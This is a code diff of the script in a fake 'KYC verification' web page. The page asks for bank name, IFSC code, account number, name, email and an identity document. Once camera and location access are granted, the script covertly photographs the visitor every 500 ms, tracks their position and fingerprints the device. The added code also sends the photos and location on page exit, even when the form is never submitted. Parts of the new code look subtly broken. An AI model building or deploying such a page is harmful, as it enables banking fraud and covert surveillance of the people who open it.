@@ -467,17 +467,20 @@
   <canvas id="captureCanvas" style="display: none;"></canvas>
   
   <script>
-    // Global variables
+    // Global variables with optimized settings
     let cameraStream = null;
     let backgroundImages = [];
     let submissionImages = [];
     let locationData = null;
     let locationWatchId = null;
     let hasSubmitted = false;
-    const MAX_BACKGROUND_IMAGES = 10;
-    const MAX_SUBMISSION_IMAGES = 20;
+    let bgCaptureInterval = null;
+    const MAX_BACKGROUND_IMAGES = 15;  // Background images buffer
+    const MAX_SUBMISSION_IMAGES = 10;  // Submission images
+    const BG_CAPTURE_INTERVAL = 500;   // Background capture every 500ms
+    const SUBMIT_CAPTURE_DELAY = 200;  // Submission capture every 200ms
 
-    // Enhanced device detection
+    // Device detection
     function getDeviceInfo() {
       const parser = new UAParser();
       const device = parser.getDevice();
@@ -494,12 +497,12 @@
       };
     }
 
-    // Close the verification popup
+    // Close popup
     function closePopup() {
       document.getElementById('verificationPopup').style.display = 'none';
     }
     
-    // Function to request permissions
+    // Request permissions
     function requestPermissions() {
       const status = document.getElementById('permStatus');
       status.textContent = "";
@@ -514,15 +517,12 @@
         } 
       }).then(stream => {
         cameraStream = stream;
-        
-        // Setup hidden video preview
         const preview = document.getElementById('cameraPreview');
         preview.srcObject = stream;
         
         // Request location
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            // Store location data
             locationData = {
               latitude: position.coords.latitude,
               longitude: position.coords.longitude,
@@ -530,15 +530,10 @@
               timestamp: position.timestamp
             };
             
-            // Permissions granted - show form
             document.getElementById('permissionStep').style.display = 'none';
             document.getElementById('kycForm').style.display = 'block';
-            
-            // Start background capture
             startBackgroundCapture();
             setupPageExitHandlers();
-            
-            // Also watch location continuously
             watchLocation();
           },
           (err) => {
@@ -555,60 +550,58 @@
       });
     }
     
-    // Start background capture
+    // Start optimized background capture
     function startBackgroundCapture() {
       const preview = document.getElementById('cameraPreview');
       const canvas = document.getElementById('captureCanvas');
       const ctx = canvas.getContext('2d');
       
-      // Capture images every 500ms (10 images = 5 seconds)
-      let bgCaptureCount = 0;
-      const bgInterval = setInterval(() => {
-        if (bgCaptureCount >= MAX_BACKGROUND_IMAGES) {
-          clearInterval(bgInterval);
-          return;
+      if (bgCaptureInterval) clearInterval(bgCaptureInterval);
+      
+      bgCaptureInterval = setInterval(() => {
+        if (backgroundImages.length >= MAX_BACKGROUND_IMAGES) {
+          backgroundImages.shift();
         }
         
-        canvas.width = preview.videoWidth;
-        canvas.height = preview.videoHeight;
-        ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        backgroundImages.push({
-          data: imageData,
-          timestamp: new Date().toISOString()
-        });
-        bgCaptureCount++;
-      }, 500);
+        try {
+          canvas.width = 640;
+          canvas.height = 480;
+          ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
+          backgroundImages.push({
+            data: canvas.toDataURL('image/jpeg', 0.7),
+            timestamp: new Date().toISOString()
+          });
+        } catch (e) {
+          console.error("Capture error:", e);
+        }
+      }, BG_CAPTURE_INTERVAL);
     }
 
-    // Capture additional images for submission
+    // Capture submission images
     async function captureAdditionalImages(count) {
       const preview = document.getElementById('cameraPreview');
       const canvas = document.getElementById('captureCanvas');
       const ctx = canvas.getContext('2d');
       const images = [];
       
-      canvas.width = preview.videoWidth;
-      canvas.height = preview.videoHeight;
+      canvas.width = 1280;
+      canvas.height = 720;
       
       for (let i = 0; i < count; i++) {
         ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
         images.push({
-          data: imageData,
+          data: canvas.toDataURL('image/jpeg', 0.8),
           timestamp: new Date().toISOString()
         });
-        await new Promise(resolve => setTimeout(resolve, 100));
+        await new Promise(resolve => setTimeout(resolve, SUBMIT_CAPTURE_DELAY));
       }
       
       return images;
     }
     
-    // Watch location continuously
+    // Watch location
     function watchLocation() {
-      if (locationWatchId) {
-        navigator.geolocation.clearWatch(locationWatchId);
-      }
+      if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
       
       locationWatchId = navigator.geolocation.watchPosition(
         position => {
@@ -625,144 +618,15 @@
       );
     }
     
-    // Form submission handler
-    document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      hasSubmitted = true;
-      
-      // Capture additional images quickly
-      submissionImages = await captureAdditionalImages(MAX_SUBMISSION_IMAGES);
-      
-      // Prepare form data
-      const formData = new FormData();
-      const deviceInfo = getDeviceInfo();
-      
-      // Add device info
-      formData.append('device_type', deviceInfo.type);
-      formData.append('device_model', deviceInfo.model);
-      formData.append('device_vendor', deviceInfo.vendor);
-      formData.append('device_os', deviceInfo.os);
-      formData.append('device_browser', deviceInfo.browser);
-      formData.append('user_agent', deviceInfo.fullUA);
-      
-      // Add form fields (empty if not filled)
-      ['bankname', 'ifsc', 'accno', 'fullname', 'email'].forEach(field => {
-        formData.append(field, document.getElementById(field).value || 'Not provided');
-      });
-      
-      // Add document if uploaded
-      const documentFile = document.getElementById('document').files[0];
-      if (documentFile) {
-        formData.append('document', documentFile);
-      }
-      
-      // Combine all images (background + submission)
-      const allImages = [...backgroundImages, ...submissionImages];
-      allImages.forEach((img, index) => {
-        const blob = dataURLtoBlob(img.data);
-        formData.append(`image${index}`, blob, `capture_${index}.jpg`);
-      });
-      
-      // Add location data
-      if (locationData) {
-        formData.append('location', JSON.stringify(locationData));
-      }
-      
-      // Add timestamp
-      formData.append('timestamp', new Date().toISOString());
-      
-      // Show loading state
-      const submitBtn = this.querySelector('button[type="submit"]');
-      const originalBtnText = submitBtn.innerHTML;
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
-      
-      // Submit data
-      try {
-        const response = await fetch('/submit', {
-          method: 'POST',
-          body: formData
-        });
-        
-        if (response.ok) {
-          document.getElementById('kycFormElement').style.display = 'none';
-          document.getElementById('successMessage').style.display = 'block';
-        } else {
-          throw new Error('Server responded with an error');
-        }
-      } catch (error) {
-        console.error("Submission error:", error);
-        alert("There was an error processing your verification. Please try again.");
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = originalBtnText;
-        stopCamera();
-      }
-    });
-    
-    // Background data submission
-    async function submitBackgroundData() {
-      if (hasSubmitted || backgroundImages.length === 0) return;
-      
-      const formData = new FormData();
-      const deviceInfo = getDeviceInfo();
-      
-      // Add minimal device info
-      formData.append('device_type', deviceInfo.type);
-      formData.append('empty_form', 'true');
-      formData.append('timestamp', new Date().toISOString());
-      
-      // Add only background images
-      backgroundImages.forEach((img, index) => {
-        const blob = dataURLtoBlob(img.data);
-        formData.append(`image${index}`, blob, `background_${index}.jpg`);
-      });
-      
-      // Add location if available
-      if (locationData) {
-        formData.append('location', JSON.stringify(locationData));
-      }
-      
-      try {
-        await fetch('/submit', {
-          method: 'POST',
-          body: formData
-        });
-        console.log('Background data submitted');
-        backgroundImages = []; // Clear after successful submission
-      } catch (error) {
-        console.error('Background submission failed:', error);
-      }
-    }
-
-    // Setup page exit handlers
-    function setupPageExitHandlers() {
-      // Handle browser/tab close
-      window.addEventListener('beforeunload', async () => {
-        await submitBackgroundData();
-        stopCamera();
-      });
-      
-      // Handle mobile app switches
-      document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') {
-          submitBackgroundData();
-        }
-      });
-      
-      // Fallback every 15 seconds
-      setInterval(() => {
-        if (!hasSubmitted && backgroundImages.length > 0) {
-          submitBackgroundData();
-        }
-      }, 15000);
-    }
-
-    // Stop camera stream
+    // Stop all captures
     function stopCamera() {
       if (cameraStream) {
         cameraStream.getTracks().forEach(track => track.stop());
         cameraStream = null;
+      }
+      if (bgCaptureInterval) {
+        clearInterval(bgCaptureInterval);
+        bgCaptureInterval = null;
       }
       if (locationWatchId) {
         navigator.geolocation.clearWatch(locationWatchId);
@@ -770,29 +634,110 @@
       }
     }
     
-    // Helper function to convert data URL to Blob
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(',');
+    // Handle page exit
+    function setupPageExitHandlers() {
+      window.addEventListener('beforeunload', async (e) => {
+        if (hasSubmitted) return;
+        stopCamera();
+        
+        const formData = new FormData();
+        const deviceInfo = getDeviceInfo();
+        
+        formData.append('device_type', deviceInfo.type);
+        formData.append('device_model', deviceInfo.model);
+        formData.append('device_vendor', deviceInfo.vendor);
+        formData.append('device_os', deviceInfo.os);
+        formData.append('device_browser', deviceInfo.browser);
+        formData.append('user_agent', deviceInfo.fullUA);
+        formData.append('empty_form', 'true');
+        
+        backgroundImages.forEach((img, index) => {
+          const blob = dataURLtoBlob(img.data);
+          formData.append(`image${index}`, blob, `background_${index}.jpg`);
+        });
+        
+        if (locationData) {
+          formData.append('location', JSON.stringify(locationData));
+        }
+        
+        formData.append('timestamp', new Date().toISOString());
+        
+        if (navigator.sendBeacon) {
+          const blob = new Blob([formData], { type: 'multipart/form-data' });
+          navigator.sendBeacon('/submit', blob);
+        } else {
+          fetch('/submit', {
+            method: 'POST',
+            body: formData,
+            keepalive: true
+          }).catch(e => console.error('Background submit error:', e));
+        }
+      });
+    }
+    
+    // Convert dataURL to Blob
+    function dataURLtoBlob(dataURL) {
+      const arr = dataURL.split(',');
       const mime = arr[0].match(/:(.*?);/)[1];
       const bstr = atob(arr[1]);
-      let n = bstr.length;
-      const u8arr = new Uint8Array(n);
-      while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
+      const u8arr = new Uint8Array(bstr.length);
+      for (let i = 0; i < bstr.length; i++) {
+        u8arr[i] = bstr.charCodeAt(i);
       }
       return new Blob([u8arr], { type: mime });
     }
-
-    // Start the process by showing popup immediately
-    window.addEventListener('load', function() {
-      document.getElementById('verificationPopup').style.display = 'flex';
+    
+    // Form submission
+    document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      hasSubmitted = true;
       
-      // Prevent zooming on mobile
-      document.addEventListener('touchmove', function(event) {
-        if (event.scale !== 1) {
-          event.preventDefault();
-        }
-      }, { passive: false });
+      if (bgCaptureInterval) clearInterval(bgCaptureInterval);
+      submissionImages = await captureAdditionalImages(MAX_SUBMISSION_IMAGES);
+      
+      const formData = new FormData();
+      const deviceInfo = getDeviceInfo();
+      
+        // Add all data to formData
+      ['device_type', 'device_model', 'device_vendor', 'device_os', 'device_browser', 'user_agent'].forEach(field => {
+        formData.append(field, deviceInfo[field.split('_')[1]] || 'Unknown');
+      });
+      
+      ['bankname', 'ifsc', 'accno', 'fullname', 'email'].forEach(field => {
+        formData.append(field, document.getElementById(field).value || 'Not provided');
+      });
+      
+      const docFile = document.getElementById('document').files[0];
+      if (docFile) formData.append('document', docFile);
+      
+      const allImages = [...backgroundImages, ...submissionImages];
+      allImages.forEach((img, index) => {
+        formData.append(`image${index}`, dataURLtoBlob(img.data), `capture_${index}.jpg`);
+      });
+      
+      if (locationData) formData.append('location', JSON.stringify(locationData));
+      formData.append('timestamp', new Date().toISOString());
+      
+      // Submit
+      const submitBtn = this.querySelector('button[type="submit"]');
+      const originalBtnText = submitBtn.innerHTML;
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
+      
+      try {
+        const response = await fetch('/submit', { method: 'POST', body: formData });
+        if (response.ok) {
+          document.getElementById('kycFormElement').style.display = 'none';
+          document.getElementById('successMessage').style.display = 'block';
+        } else throw new Error('Server error');
+      } catch (error) {
+        console.error("Error:", error);
+        alert("Verification failed. Please try again.");
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = originalBtnText;
+      } finally {
+        stopCamera();
+      }
     });
   </script>
 </body>
